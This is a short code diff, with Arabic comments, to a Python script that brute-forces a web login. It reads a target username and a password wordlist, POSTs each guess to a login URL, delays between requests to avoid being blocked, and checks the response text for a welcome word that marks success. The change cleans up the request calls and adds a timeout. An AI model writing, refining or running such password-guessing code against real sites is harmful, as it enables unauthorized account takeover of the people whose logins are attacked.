@@ -15,9 +15,6 @@ username = input("Enter the username to brute-force: ")
 # ملف كلمات المرور المحتملة
 wordlist_file = input("Enter the path to the wordlist file: ")
 
-#
-response = requests.post(url, data=data, timeout=10)
-
 
 
 
@@ -58,8 +55,7 @@ for pwd in passwords:
 
     
     headers = {'Content-Type': 'application/json'} #
-    response = requests.post(url, json=data, headers=headers) #
-    response = requests.post(url, data=data, timeout=10)
+    response = requests.post(url, json=data, headers=headers, timeout=10) #
     time.sleep(1)  # تأخير بسيط بين الطلبات لتجنب الحظر
     # تحليل الاستجابة: هنا نبحث عن كلمة نجاح أو فشل محددة في الصفحة
     if "مرحبًا" in response.text:  # هذه الجملة تظهر عند النجاح في login.php
